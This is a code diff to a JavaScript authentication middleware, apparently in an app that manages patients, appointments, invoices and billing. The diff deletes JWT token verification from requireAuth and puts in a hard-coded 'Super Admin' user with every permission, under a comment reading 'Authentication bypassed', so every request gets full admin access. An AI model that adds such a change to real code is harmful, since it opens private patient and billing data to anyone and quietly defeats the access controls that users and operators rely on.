@@ -22,18 +22,15 @@ export function extractAuthToken(request) {
 }
 
 export function requireAuth(request, response, next) {
-  const token = extractAuthToken(request)
-
-  if (!token) {
-    return response.status(401).json({ message: 'Unauthorized access.' })
+  // Authentication bypassed: automatically grant super_admin access
+  request.user = {
+    _id: 'admin_bypass',
+    fullName: 'Admin User',
+    role: 'admin',
+    roleLabel: 'Super Admin',
+    permissions: ['manage_appointments', 'manage_patients', 'manage_invoices', 'manage_billing', 'manage_reviews', 'generate_reports', 'manage_settings']
   }
-
-  try {
-    request.user = jwt.verify(token, process.env.JWT_SECRET)
-    next()
-  } catch {
-    response.status(401).json({ message: 'Invalid or expired token.' })
-  }
+  next()
 }
 
 export function requirePermission(permission) {
